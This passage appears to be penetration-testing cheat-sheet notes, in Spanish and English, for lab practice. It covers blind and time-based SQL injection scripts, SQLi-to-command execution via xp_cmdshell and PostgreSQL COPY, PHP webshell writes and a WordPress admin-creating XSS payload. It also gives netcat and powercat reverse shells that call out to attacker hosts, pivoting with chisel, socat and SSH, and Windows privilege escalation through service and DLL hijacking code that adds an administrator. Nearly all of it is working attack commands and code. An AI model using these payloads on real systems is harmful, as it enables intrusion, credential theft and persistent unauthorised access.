echo "Longitud inicial:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin" -x "127.0.0.1:8080" | wc -m; while IFS= read -r p; do echo "SQL injection $p:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin'+AND+(SELECT+'a'+FROM+$p+LIMIT+1)='a" -x "127.0.0.1:8080" | wc -m;done < sqli_tables.txt
```

```bash
// Identificar columns con diccionario
echo "Longitud inicial:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin" -x "127.0.0.1:8080" | wc -m; while IFS= read -r p; do echo "SQL injection $p:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin'+AND+(SELECT+column_name+FROM+information_schema.columns+WHERE+table_name='users'+and+column_name='$p'+LIMIT+1)='$p" -x "127.0.0.1:8080" | wc -m;done < sqli_columns.txt
```

```bash
// Identificar nombre de usuario, wordlist
echo "Longitud inicial:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin" -x "127.0.0.1:8080" | wc -m; while IFS= read -r p; do echo "SQL injection $p:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin'+AND+(SELECT+username+FROM+users+WHERE+username='$p'+LIMIT+1)='$p" -x "127.0.0.1:8080" | wc -m;done < sqli_users.txt 
```

```bash
// Identificar tamaño de passwd. el usuario debe ser valido
for p in $(seq 1 1 50); do echo "$p" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin'+AND+(SELECT+'a'+FROM+users+WHERE+username='admin'+AND+LENGTH(password)>$p)='a" -x "127.0.0.1:8080" | wc -m; done
```

```bash
// Minar hash de password letra por letra
for p in $(seq 1 1 32); do while IFS= read -r pp; do RES=$(curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin'+AND+(SELECT+SUBSTRING(password,$p,1)+FROM+users+WHERE+username='admin')='$pp" -x "127.0.0.1:8080" | wc -m) && if [ $RES == "1476" ]; then echo "$pp:$RES" && break; fi ;done < sqli_letras_numeros.txt ; done
```

#### Time-based

```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
select if(1=0,true,false);
```

// Mysql
```sql
'+AND+IF+(1=1,sleep(3),'false
'+AND+IF+(1=1,sleep(3),'false')+--+
```

//Postgres
```sql
1';SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
';select+pg_sleep(10)--
```

// MSSQL
```sql
';+WAITFOR+DELAY+'0:0:03'--
```


```bash
// Identificar SQLi basado en tiempo
while IFS= read -r p; do echo "[+] Payload: $p"; start=$(date +%s); curl -s -i -X GET "http://192.168.239.16/blindsqli.php?user=admin$p" -x "127.0.0.1:8080"| grep -E "SQL syntax|500|Internal Server|OFFSEC321|Content-Length"; end=$(date +%s); echo "Time: $(($end-$start)) seconds"; done < sqli_payloads.txt
```

#### Code Execution

MSSQL
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

```bash
';EXECUTE+sp_configure+'show+advanced+options',1;RECONFIGURE;EXECUTE+sp_configure+'xp_cmdshell',1;RECONFIGURE;EXECUTE+xp_cmdshell+'ping+192.168.45.156';--
```

```bash
';EXECUTE+sp_configure+'show+advanced+options',1;RECONFIGURE;EXECUTE+sp_configure+'xp_cmdshell',1;RECONFIGURE;EXECUTE+xp_cmdshell+'powershell%20%2dencode%20JABjAGw...
```

```bash
pwsh
$Text = 'IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.222:8081/powercat.ps1");powercat -c 192.168.45.222 -p 444 -e powershell'                
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)           
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```

// Mysql
```php
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
<? system($_REQUEST['cmd']); ?>
```

```bash
/var/www/
/var/www/html
/var/www/htdocs
/usr/local/apache2/htdocs
/usr/local/www/data
/var/apache2/htdocs
/var/www/nginx-default
/srv/www/htdocs
/usr/local/var/www

curl -s -i -X POST -d "item='+UNION+SELECT+NULL,\"<?php+system(\$_GET['cmd']);?>\",NULL,NULL,NULL+INTO+OUTFILE+\"/var/www/html/tmp/webshell.php\"+--+" http://192.168.239.19/search.php -x "127.0.0.1:8080" | grep "OFFSEC"

curl -s 'http://192.168.239.19/tmp/webshell.php?cmd=whoami'
```

// Postgres
https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767
https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/

* Read files
```
CREATE TABLE read_files(output text);
COPY read_files FROM ('/etc/passwd');
SELECT * FROM read_files;
```

* Command_Execution

```
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
```

```
';CREATE+TABLE+shell(output+text);COPY+shell+FROM+PROGRAM+'ping+192.168.45.156';--
';COPY+shell+FROM+PROGRAM+'nc+%2de+/bin/sh+192.168.45.156+4444';--
```
 
 * Escribir
```
';COPY+(SELECT+'hola')+TO+'/tmp/a.txt';--
';COPY+(SELECT+'hola')+TO+'/var/www/html/a.txt';--
```
```
';CREATE+TABLE+T+(c+text);INSERT+INTO+T(c)+VALUES+('hola');SELECT+*+FROM+T;COPY+T(c)+TO+'/tmp/test.txt';--
```

// Password hash wordpress
```bash
curl -s -i -X GET "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2CNULL%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users"

john hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

### CMS

#### Wordpress
https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/
https://github.com/hakluke/weaponised-XSS-payloads/blob/master/wordpress_create_page.js
https://jscompress.com/

```bash
Scanning
wpscan --url http://<URL>
wpscan --url http://<URL> -e vp
wpscan --url http://<URL> -e ap
```

- Authentication Attack
Burp Suite --> Intruder --> Sniper (Login:pwd) --> /usr/share/wordlists/rockyou.txt 

- CVEs
https://www.exploit-db.com/exploits/49972
WordPress Visitors Plugin <= 0.3 is vulnerable to Cross Site Scripting (XSS)

- XSS

How to craft an XSS payload to create an admin user in WordPress
https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/
https://gist.github.com/LukaSikic/48f30805b10e2a4dfd6858ebdb304be9

1. Create nonce
```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
2. Create user
```
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```


# Explotation

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
/bin/bash -i
/bin/sh -i
```

```bash
// Interactive shell
script /dev/null -c bash
ctrl + ^Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows 17 columns 144

stty -a
export TERM=xterm-256color
```

- Oneliner decode payload
```
echo -n '<?php system($_GET["c"]); ?>' | od -A n -t x1 | sed 's/ *//g' | tr -d '\n'
echo -n '<?php system($_GET["c"]); ?>' | xxd -p
```

```
echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e | xxd -r -p
<?php system($_GET["c"]); ?>
```


## Explois

### Exploit DB
https://www.exploit-db.com/
```bash
searchsploit SmarterMail
searchsploit -x 15048
searchsploit -m 15048
```

#### CVEs


# Pivoting

- Enumeration host
```bash
arp-scan 192.168.100.0/24
```

- Script enum host
```bash
#!/bin/bash
hosts=("192.168.100" "192.168.101")

for host in ${hosts[@]}; do
        echo -e "[+] Enum host $host.0/24"
        for i in $(seq 1 255); do
                timeout 1 bash -c "ping -c 1 $host.$i" &>/dev/null && echo "$host.$i up" & 
        done; wait
done


kali$ base64 -w 0 enum-host.sh 
IyEvYmluL2Jhc2gKaG9zdHM9KCIxOTIuMTY4LjEwMCIgIjE5Mi4xNjguMTAwIikKCmZvciBob3N0IGluICR7aG9zdHNbQF19OyBkbwoJZWNobyAtZSAiWytdIEVudW0gaG9zdCAkaG9zdC4wLzI0IgoJZm9yIGkgaW4gJChzZXEgMSAyNTUpOyBkbwoJCXRpbWVvdXQgMSBiYXNoIC1jICJwaW5nIC1jIDEgJGhvc3QuJGkiICY+L2Rldi9udWxsICYmIGVjaG8gIiRob3N0LiRpIHVwIiAmIAoJZG9uZTsgd2FpdApkb25lCg==

kali$ echo "IyEvYmluL2Jhc2gKaG9zdHM9KCIxOTIuMTY4LjEwMCIgIjE5Mi4xNjguMTAwIikKCmZvciBob3N0IGluICR7aG9zdHNbQF19OyBkbwoJZWNobyAtZSAiWytdIEVudW0gaG9zdCAkaG9zdC4wLzI0IgoJZm9yIGkgaW4gJChzZXEgMSAyNTUpOyBkbwoJCXRpbWVvdXQgMSBiYXNoIC1jICJwaW5nIC1jIDEgJGhvc3QuJGkiICY+L2Rldi9udWxsICYmIGVjaG8gIiRob3N0LiRpIHVwIiAmIAoJZG9uZTsgd2FpdApkb25lCg==" | base64 -d > enum-host-2.sh 
```

```bash
for host in $(echo "192.168.100"); do echo -e "[+] Enum host $host.0/24\n"; for i in $(seq 1 255); do timeout 1 bash -c "ping -c 1 $host.$i" &>/dev/null && echo "$host.$i up"; done; done
```

- Enumerate ports

```
for i in $(seq 1 254); do nc -zv -w 1 172.16.198.$i 445; done
```

```bash
#!/bin/bash
function ctrl_c(){
        echo -e "\n [+] Salir\n"
        exit 1
}
trap ctrl_c INT
hosts=("192.168.100.1" "192.168.100.3")
tput civis
for host in ${hosts[@]}; do
        echo -e "[+] Scanning ports on $host"
        for port in $(seq 1 10000); do
                timeout 1 bash -c "echo '' > /dev/tcp/$host/$port" 2>/dev/null && echo -e "[+] Port $port -OPEN" & 
        done; wait
done
tput cnorm
```


- Transfer Files
https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/

```bash
nc -nlvp 4444 < chisel
cat > chisel < /dev/tcp/<IP>/4444
```

```
<kali> impacket-smbserver -smb2support -user kali -password kali test $(pwd) 

<Win> net use x: \\192.168.45.185\test /user:kali kali
<Win> copy \\192.168.45.185\test\hahes.txt hahes.txt
<Win> net use x: /d
```



## Chisel
https://github.com/jpillora/chisel/releases?page=2
https://github.com/cryproot/eJPTV2-Notas-Comandos-Cheats/tree/main/eCPPTv2/Tools

```bash
go build -ldflags "-s -w" .
upx brute chisel
./chisel
```

```bash
<kali> ./chisel server --reverse -p 1234
<vic1> ./chisel client <MiIP>:1234 R:127.0.0.1:80:<v1ct2>:80 R:127.0.0.1:443:<v1ct2>:443
```

![](images/Remote_PortForwarding.jpg)



## Socat
https://github.com/aledbf/socat-static-binary/releases
https://github.com/cryproot/eJPTV2-Notas-Comandos-Cheats/tree/main/eCPPTv2/Tools
http://www.dest-unreach.org/socat/download/

```
//Kali linux to Machine compromised
ssh database_admin@192.168.198.63 -p 4422

//Machine compromised to other machine
socat -ddd TCP-LISTEN:4422,fork TCP:10.4.198.215:22

//Machine compromised to me
socat -ddd TCP-LISTEN:4422,fork TCP:<MiIP>:22
```

![](images/Socat.jpg)


## SSH
### Local Port Forwarding 

Kali --> Victim1 --> Postgres --> Windows (4242)
1. Create local port
```
// Create listen port on victim1 and to forward 172.16.198.63 by machine Postgres 
<victim1> ssh -N -L 0.0.0.0:4242:172.16.198.217(Windows):4242 database_admin@10.4.198.215 (Postgres)
```
2. Exploit local port
```
<kali>    ./ssh_local_client -i 192.168.198.63 (vitim1) -p 4242
```

### Dynamic Port Forwarding 

1. Create port dynamic
```
<victim1> ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```
2. Configure proxychain
```
<kali>nano /etc/proxychains4.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 192.168.50.63 9999
```
3. Exploit dynamic port forwarding
```
proxychains smbclient -L //172.16.50.217/ -U user --password=pwd1234
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

### Remote Dynamic Port Forwarding 

1. Create Remote Dynamic Port Forwarding
```
ssh -N -R 9998 kali@192.168.118.4
```

2. Configurate Proxy Chains
```
tail /etc/proxychains4.conf
...
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998
```

3. Exploit Remote Dynamic Port Forwarding
```
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```


### sshuttle

```
<vict1> socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
<kali> sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
<kali> smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

### plink
https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe

```
<victim> C:\Windows\Temp\plink.exe -ssh -l kali -pw <mypass> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.185
<kali> xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```


# Privilege Escalation
https://github.com/izenynn/c-reverse-shell
https://omergnscr.medium.com/simple-reverse-shell-in-c-be1c2f8a40b8
https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html
https://github.com/cocomelonc/OffensiveCpp

## Exploits
https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/


## Linux Priv
Ubuntu 18.04.5, 20.04.1, Debian 10.0
https://github.com/blasty/CVE-2021-3156
https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156


## Windows Priv
https://book.jorianwoltjer.com/windows/local-privilege-escalation
https://book.hacktricks.xyz/v/es/windows-hardening/basic-cmd-for-pentesters
https://github.com/cobbr/SharpSploit
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/tree/master/Notes

* User name and group information with SID, claims, privileges, logon identifier (logon ID) for the current user
```
hostname
whoami /groups
whoami /priv
whoami /all
```

* Users and groups
```
id
net user admin
net users
powershell -ep bypass -c "Get-LocalUser"
net localgroup
powershell -ep bypass -c "Get-LocalGroup"
net localgroup "Remote Management Users"
powershell -ep bypass -c "Get-LocalGroupMember Administrators"
```

* Display the application's names
```
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname"
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname"
```

* System
```
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
PS>cmd.exe /c 'systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"'

// Patch Levels
wmic qfe get Caption, Description, HotFixID, InstalledOn
wmic product get name, version, vendor
wmic logicaldisk
```

* Network
```
ipconfig /all
route print
netstat -ano
ip a
```

* Process and path's
```
Get-Process

ps | % {$_.Path}
Get-Process | ForEach-Object {$_.Path}

$path = Get-Process | Select-Object Path
$path.path

tasklist /SVC
```

* Sensitive files
```
// Find files sentive
powershell -ep bypass -c "Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
powershell -ep bypass -c "Get-ChildItem -Path C:\Users\admin -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue"

//History powershell
powershell -ep bypass -c "Get-History"
powershell -ep bypass -c "(Get-PSReadlineOption).HistorySavePath"

Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
exit
Stop-Transcript
type C:\Users\Public\Transcripts\transcript01.txt

// Eventlog
Get-WinEvent -FilterHashtable @{logname = "Microsoft-Windows-PowerShell/Operational"; id = 4104 } | select -ExpandProperty message
Get-WinEvent -FilterHashtable @{logname = "PowerShellCore/Operational"; id = 4104 } | select -ExpandProperty message

// Decode64
powershell -c "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>'))"
```

* Change users
```
runas /user:admin cmd
powershell.exe Start-Process cmd.exe -Verb runAs

$password = ConvertTo-SecureString "mipass123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("admin", $password)
Enter-PSSession -ComputerName CLIENTWIN -Credential $cred
whoami

evil-winrm -i 192.168.50.220 -u admin -p "mipass123\!\!"
```

```
$Username = "clientwk222\alex"
$password = "WelcomeToWinter0121"
$pwd = ConvertTo-SecureString $password -AsPlainText -Force
$cred = new-object system.Management.Automation.PScredential($Username,$pwd)

Invoke-Command -ComputerName clientwk222 -ScriptBlock {C:\Services\nc.exe -e cmd 192.168.45.156 4444} -credential $cred;
```


* Scheduled Tasks
```
schtasks /query /fo LIST /v
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

* Readable/Writable Files and Directories
```
accesschk.exe -uws "Everyone" "C:\Program Files"
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

* Binaries That AutoElevate
https://juggernaut-sec.com/alwaysinstallelevated/
https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

* Disks and drivers
```
mountvol

driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

* Enumerate Firewall
```
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```

### Automated Enumeration

* WinPEAS
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe
https://github.com/peass-ng/PEASS-ng/releases/tag/20240512-3398870e
```
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
C:\Users\admin\Desktop>winPEASx64.exe
```

* Seatbelt
https://github.com/GhostPack/Seatbelt
```
Seatbelt.exe -group=all -full -outputfile="C:\Users\admin\Desktop\system.txt"
```

* JAWS
https://github.com/411Hall/JAWS
```
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
```

* BeRoot
https://github.com/AlessandroZ/BeRoot
```
beRoot.exe
```

* Watson
https://github.com/rasta-mouse/Watson
```
Watson.exe
```

* PowerUp
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
```
Import-Module .\PowerUp.ps1
Invoke-Allchecks
```

* Windows-privesc-check
https://github.com/pentestmonkey/windows-privesc-check
```
windows-privesc-check2.exe
```

### Service Binary Hijacking

F --> Full
M --> Modify access
RX --> Read and execute access
R --> Read-only access
W --> Write-only access

Everyone
Authenticated Users
BUILTIN\Users
NT AUTHORITY\INTERACTIVE


* Discovery Vuln
```
powershell -ep bypass -c "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}"
```

* Discovery weak permissions
```
icacls "C:\xampp\mysql\bin\mysqld.exe"
...
BUILTIN\Users:(F)
```

* Code to create user 
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user miuser password123! /add");
  i = system ("net localgroup administrators miuser /add");
  
  return 0;
}

kali# x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

* Tranfer and reemplace binary 
```
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

* Verify service state "Auto"
```
powershell -ep bypass -c "Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}"
wmic service where caption="mysql" get name, caption, state, startmode
...
mysql Auto
```

* Verify permissions to reset system
```
C:\> whoami /priv
...
SeShutdownPrivilege           Shut down the system                 Disabled

C:\> shutdown /r /t 0
```

* Exploit: Verify user and chance mode to admin
```
net users
net localgroup administrators
runas /user:miuser cmd
powershell -ep bypass -c "Start-Process powershell -Verb runAs"
```

* Exploit PowerUP
```
> . .\PowerUp-new.ps1
> Get-ModifiableServiceFile
Install-ServiceBinary -Name BackupMonitor -UserName backdoor -Password Password123!
```


###  Service DLL Hijacking
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking

Note: To execute Process monitor requires admin privileges. To create a scenario on your computer, chek tip

1. Find service, task, AutoRuns or process with privilege
```
// Find services
powershell -ep -c "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}"
```

2. Analyze with Process Monitor to find vulnerable DLL
* Menu Filter --> Filter
* Process Name as Column, is as Relation, ServiceVuln.exe as Value, and Include as Action. Once entered, we'll click on Add

```
// Reset to analyze DLLs
Restart-Service ServiceVuln
```

3. Compile and create DLL 
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user miuser password123! /add");
  	    i = system ("net localgroup administrators miuser /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```
4. Move DLL to directory 
```
iwr -uri http://192.168.45.231:8081/myDLL.dll -Outfile myDLL.dll
move myDLL.dll Documents\myDLL.dll
```

5. Reset service vulnerable to execute DLL
```
powershell -ep bypass -c "Restart-Service ServiceVuln"
```

6. Validate alnd login user 
```
net users
net localgroup administrators
runas /user:miuser cmd
powershell -ep bypass -c "Start-Process powershell -Verb runAs"
```

* PowerUP
```
. .\PowerUp-new.ps1
 Find-ProcessDLLHijack
```

* Tip: create service with vulnerable service "exe"  on system mine

```
//vulnerable service to Hijacking DLL 
sc create miSerVuln binPath="C:\Users\steve\Documents\BetaServ.exe"  DisplayName="miSerVuln" start= auto
net start miSerVuln
powershell -ep bypass -c "Restart-Service miSerVuln"
```

* Tip: You can check if SafeDLLSearchMode is enabled in the registry:
```
# Enabled = 1, Disabled = 0
reg query 'HKLM\System\CurrentControlSet\Control\Session Manager' /v SafeDllSearchMode
# or
Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Session Manager' -Name SafeDllSearchMode
```


### Unquoted Service Paths

https://github.com/GhostPack/SharpUp

1. Check services without quotation marks
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

* Check permissions on service: check who user that execute
```
powershell -ep bypass -c "Get-CimInstance -ClassName win32_service | Select Name,State,PathName"

sc query GammaService
icacls "C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe"
```

3. Check permissions on folder
```
icacls "C:\Program Files\Enterprise Apps"
```

4. Create binary
```
C:\Program Files\Enterprise Apps\Current.exe
```

5. Exploit: Move binary and start service
```
powershell -ep bypass -c "iwr -uri http://192.168.45.231:8081/adduser.exe -Outfile adduser.exe"
move adduser.exe "C:\Program Files\Enterprise Apps\Current.exe"

net start GammaService
powershell -ep bypass -c "Start-Service GammaService"
```

```
net user
net localgroup administrators

runas /user:miuser cmd
powershell -ep bypass -c "Start-Process powershell -Verb runAs"
```

* SharpUp
https://github.com/GhostPack/SharpUp
```
SharpUp.exe UnquotedServicePath
```



### Scheduled Tasks

1. Check task
```
schtasks /query /fo LIST /v
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v | findstr /B "Task To"
```

```
Get-ScheduledTask
powershell -ep bypass -c "Get-ScheduledTask | ft TaskName,TaskPath,State"
powershell -ep bypass -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | ft TaskName,TaskPath,State"
```

```
$header="HostName","TaskName","NextRunTime","Status","LogonMode","LastRunTime","LastResult","Author","TaskToRun","StartIn","Comment","ScheduledTaskState","IdleTime","PowerManagement","RunAsUser","DeleteTaskIfNotRescheduled","StopTaskIfRunsXHoursandXMins","Schedule","ScheduleType","StartTime","StartDate","EndDate","Days","Months","RepeatEvery","RepeatUntilTime","RepeatUntilDuration","RepeatStopIfStillRunning"

schtasks /query /fo csv /nh /v | ConvertFrom-Csv -Header $header | select -uniq TaskName,NextRunTime,Status,TaskToRun,RunAsUser | Where-Object {$_.RunAsUser -ne $env:UserName -and $_.TaskToRun -notlike "%windir%*" -and $_.TaskToRun -ne "COM handler" -and $_.TaskToRun -notlike "%systemroot%*" -and $_.TaskToRun -notlike "C:\Windows\*" -and $_.TaskName -notlike "\Microsoft\Windows\*"}
```

2. Check task permissions
```
icacls C:\Users\TaskVuln.exe
```

3 . Replace binary to Task 
```
powershell -ep bypass -c "iwr -Uri http://192.168.45.231:8081/adduser.exe -Outfile adduser.exe"
move adduser.exe C:\Users\TaskVuln.exe
net user
net localgroup administrators
```


https://github.com/camercu/oscp-prep/blob/main/CHEATSHEET.md
https://hideandsec.sh/books/cheatsheets-82c/page/active-directory
https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html


# AD
https://shuciran.github.io/posts/DCSync/
https://www.kayssel.com/post/interesting-groups-ad/

## AD Enumeration

```
net user /domain
net user miuser /domain
net group /domain
net group "My Department" /domain
```

.\enumeration_ldap.ps1
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()
Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    Write-Host "-------------------------------"
}
```

```powershell
$dirsearcher.filter="name=useradmin"
$result = $dirsearcher.FindAll()
Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop.memberof
    }
    Write-Host "-------------------------------"
}
```

.\function_ldap.ps1
```powershell
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```

```powershell
Import-Module .\function.ps1
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
LDAPSearch -LDAPQuery "(objectclass=group)"
```

```powershell
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {$group.properties | select {$_.cn}, {$_.member} }

sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Dep))"
$sales.properties.member

//group into group
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Dev Department*))"
$group.properties.member
```

### AD Enumeration - Powerview

```powershell
Import-Module .\PowerView.ps1
```

```powershell
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon

Get-NetGroup | select cn
Get-NetGroup "Sales Dep" | select member

Get-NetComputer | select cn,operatingsystem,operatingsystemversion,dnshostname,DistinguishedName
```

```powershell
Find-LocalAdminAccess
Get-NetSession -ComputerName client_hostname
.\PsLoggedon.exe \\client_hostname
```

### AD Enumeration - Principal Names

```powershell
setspn -L iis_service
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### AD Enumeration - ACLs
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md

1. GenericAll: Full permissions on object
2. GenericWrite: Edit certain attributes on the object
3. WriteOwner: Change ownership of the object
4. WriteDACL: Edit ACE's applied to object
5. AllExtendedRights: Change password, reset password, etc.
6. ForceChangePassword: Password change for object
7. Self (Self-Membership): Add ourselves to for example a group

```powershell
Get-ObjectAcl -Identity juan
```

```powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

